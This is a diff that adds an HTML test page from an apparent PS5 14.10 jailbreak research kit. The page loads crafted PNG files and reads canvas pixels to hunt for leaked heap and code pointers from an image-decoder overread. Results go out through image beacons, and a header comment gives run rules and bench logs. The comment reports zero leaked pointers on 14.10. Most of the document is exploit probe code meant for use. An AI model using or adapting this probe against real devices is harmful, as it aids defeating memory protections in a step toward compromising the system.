@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<!--
+PUBLISHED v674-family kit page (cobrajet302gt bench). Published copy of bench page
+"v674.html" renamed to match its on-wire beacon prefix P674. Naming map (three IDs
+circulate for this instrument): desk scoreboard "V674" | board capture lines
+"v674/v674b" | on-wire + published prefix "P674/P674B".
+RUN RULES (these decide landing; they ship inside the file): serve the payloads/ dir
+of this kit at path /payloads/ with EXACT filenames; beacons are RELATIVE
+/beacon/P674-<TAG>|<msg> and resolve against your own host - capture all of them.
+Grade per load; an unattributed or out-of-window beacon stream = zero (house decode).
+LOADTO fires at 6500 ms only if the JS context is still alive: no STAT/ERR/LOADTO at
+all after a payload GET means the load context died mid-decode.
+PROOF GRADE [M] 14.10 Guide WebView, bench beacon log, 2026-10-23 x3 + 2026-11-05 x3:
+3/3 loads completed (DONE fired): CTRL-PTRS nz4=16384 heap=0 code=0 other8=8192;
+LEAK-PTRS nz4=0 heap=0 code=0 other8=0; TRUNC-PTRS all-zero. Zero pointer candidates
+on 14.10. Board position agrees: this instrument produced ZERO leaked pointers in
+every on-board capture; "1651 heap pointers" is a desk scoreboard label, not a board
+result row (anchor set: cobrajet302gt/PS5-14.10-Jailbreak-Research issue #10,
+addendum L11).
+Payload sha256 (must match what you serve):
+  v674_ctrl.png   5f5d5f5f0ae940731b47dcddae17e44ac0f0fba042e490b4fa3fefb45b9044ca
+  v674_leak.png   43a65d5863fadd090eb74cb6b6f0b8a28dbe253bce38fb53bef85fcc21967876
+  v674_trunc.png  744a7e243a227f3d907c26f7bb68476eefe16cd4a3e29f3ed0a360d5f798b41f
+Code below is byte-identical to the bench artifact; this comment block is the only
+addition.
+-->
+<html><head><meta charset="utf-8"><title>P674</title></head><body>
+<h3>V674 standalone PNG overread leak (our kit port)</h3>
+<script>
+var BK='/beacon/';
+function bk(t,m){ var im=new Image(); im.src=BK+'P674-'+t+'|'+encodeURIComponent(String(m)).slice(0,140)+'?n='+Math.random(); }
+
+function loadProbe(name, url, cb){
+  var img = new Image();
+  img.onload = function(){ cb(img, true); };
+  img.onerror = function(){ bk(name+'-LOAD','ERR'); cb(img, false); };
+  img.src = url + '?n=' + Math.random();
+}
+
+function readRow(img, cb){
+  var W0 = img.width|0, H0 = img.height|0;
+  bk(img._nm+'-STAT', 'dims='+W0+'x'+H0);
+  if(!(W0>0&&H0>0)){ cb(null); return; }
+  var cv = document.createElement('canvas'); cv.width = W0; cv.height = H0;
+  var g = cv.getContext('2d');
+  if(!g){ bk(img._nm+'-CANVAS','no-ctx'); cb(null); return; }
+  g.drawImage(img, 0, 0, W0, H0);
+  var readRows = function(){
+    try{
+      var id = g.getImageData(0, 0, W0, 1);
+      var d = (id && id.data) ? id.data : id;
+      cb(d);
+    }catch(e){ bk(img._nm+'-GID','ERR '+e.name+':'+String(e.message).slice(0,60)); cb(null); }
+  };
+  if(window.requestAnimationFrame) requestAnimationFrame(function(){ setTimeout(readRows,60); });
+  else setTimeout(readRows,300);
+}
+
+function scanPointers(name, d, cb){
+  if(!d){ bk(name+'-PTRS','nodata'); return; }
+  var nz=0, heap=[], code=[], other=0;
+  var n = Math.min(d.length, 65536);
+  for(var i=0;i<n;i+=4){
+    if(d[i]||d[i+1]||d[i+2]||d[i+3]) nz++;
+  }
+  // 8-byte LE qwords from RGBA quads: q = (b3<<56)|(b2<<48)|(b1<<40)|(b0<<32)... simpler: hi32 = d[i+4..7], lo32 = d[i..3]
+  for(var j=0;j+8<=n;j+=8){
+    var hi = (d[j+7]<<24)|(d[j+6]<<16)|(d[j+5]<<8)|d[j+4];
+    var hiU = hi>>>0;
+    if(hiU>=0x00000008 && hiU<=0x000000FF){ heap.push(j); }
+    else if(hiU>=0x00000001 && hiU<=0x00000007){ code.push(j); }
+    else if(d[j]||d[j+1]||d[j+2]||d[j+3]||d[j+4]||d[j+5]||d[j+6]||d[j+7]) other++;
+  }
+  bk(name+'-PTRS','nz4='+nz+' heap='+heap.length+' code='+code.length+' other8='+other);
+  // top-20 heap qwords as hex via DataView-safe assembly
+  function hex8(j){
+    var s='0x';
+    for(var k=7;k>=0;k--) s += ('0'+(d[j+k]||0).toString(16)).slice(-2);
+    return s;
+  }
+  var show = heap.slice(0,10);
+  for(var t=0;t<show.length;t+=5){
+    bk(name+'-TOP'+t, show.slice(t,t+5).map(hex8).join(','));
+  }
+  var showc = code.slice(0,10);
+  for(var u=0;u<showc.length;u+=5){
+    bk(name+'-TOPC'+u, showc.slice(u,u+5).map(hex8).join(','));
+  }
+  cb(null);
+}
+
+function run(name, url){
+  loadProbe(name, url, function(img, ok){
+    img._nm = name;
+    if(!ok) return;
+    readRow(img, function(d){ scanPointers(name, d, function(){}); });
+  });
+}
+
+bk('BOOT','v1');
+// control first: honest length, must scan ~all-white (nz4 near 0 past the real data)
+run('CTRL','/payloads/v674_ctrl.png');
+setTimeout(function(){ run('LEAK','/payloads/v674_leak.png');
+  setTimeout(function(){ run('TRUNC','/payloads/v674_trunc.png'); setTimeout(function(){ bk('DONE',''); },9000); }, 2500); }, 2500);
+</script>
+</body></html>
